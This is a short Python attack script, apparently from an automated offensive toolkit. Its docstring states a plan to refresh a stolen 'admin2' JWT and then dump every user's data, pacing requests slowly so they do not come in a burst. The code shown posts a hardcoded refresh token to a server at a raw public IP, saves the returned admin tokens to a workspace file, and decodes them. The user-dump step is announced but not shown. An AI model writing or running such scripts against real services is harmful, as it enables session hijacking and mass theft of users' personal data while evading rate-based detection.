#!/usr/bin/env python3
"""
Step 1: Refresh admin2 JWT
Step 2: Dump all users with new JWT (no burst - sequential + 200ms delay)
"""
import json
import time
import urllib.request
import urllib.error
import base64

REFRESH = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MzcsImlhdCI6MTc4ODA4ODQyM30.0HSMt3iwLjtQXkq2HBKRq3EAhkW75CD2iOCYgEjBYZ4"

print("=== Refreshing JWT ===")
url = "http://35.234.50.28:3400/refreshToken"
data = json.dumps({"refreshToken": REFRESH}).encode()
req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}, method="POST")
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        body = r.read().decode()
        print(f"refreshToken -> {r.status}")
        j = json.loads(body)
        print(f"keys: {list(j.keys())[:10]}")
        NEW_JWT = j.get('token')
        NEW_REFRESH = j.get('refreshToken')
        if NEW_JWT:
            print(f"NEW JWT: {NEW_JWT[:80]}...")
            print(f"NEW JWT len: {len(NEW_JWT)}")
            with open("/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/tokens.json", "w") as f:
                json.dump({"jwt": NEW_JWT, "refreshToken": NEW_REFRESH}, f, indent=2)
            # Quick verify
            import base64 as b
            parts = NEW_JWT.split('.')
            payload = b.urlsafe_b64decode(parts[1] + '=' * (4 - len(parts[1])%4)).decode()
            print(f"payload: {payload[:500]}")
        else:
            print(f"No JWT in response!")
            print(f"body: {body[:500]}")
except urllib.error.HTTPError as e:
    print(f"refresh err {e.code}: {e.read().decode()[:500]}")
except Exception as e:
    print(f"refresh err: {e}")